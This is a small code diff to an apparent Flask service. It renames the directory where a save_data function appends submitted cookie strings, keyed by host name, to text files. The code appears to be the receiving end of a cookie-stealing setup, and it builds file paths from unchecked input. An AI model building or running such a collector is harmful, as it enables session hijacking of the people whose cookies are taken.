@@ -14,12 +14,12 @@ from flask_cors import CORS
 def save_data(data):
     get_time = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
 
-    if os.path.isdir(f"{os.getcwd()}/cookie"):
-        with open(f"cookie/{data['host']}.txt", "a", encoding="utf-8") as f:
+    if os.path.isdir(f"{os.getcwd()}/cookies"):
+        with open(f"cookies/{data['host']}.txt", "a", encoding="utf-8") as f:
             f.write(get_time + '\t' + data['cookie'] + '\n')
     else:
-        os.mkdir(f"{os.getcwd()}/cookie")
-        with open(f"cookie/{data['host']}.txt", "a", encoding="utf-8") as f:
+        os.mkdir(f"{os.getcwd()}/cookies")
+        with open(f"cookies/{data['host']}.txt", "a", encoding="utf-8") as f:
             f.write(get_time + '\t' + data['cookie'] + '\n')
 
 
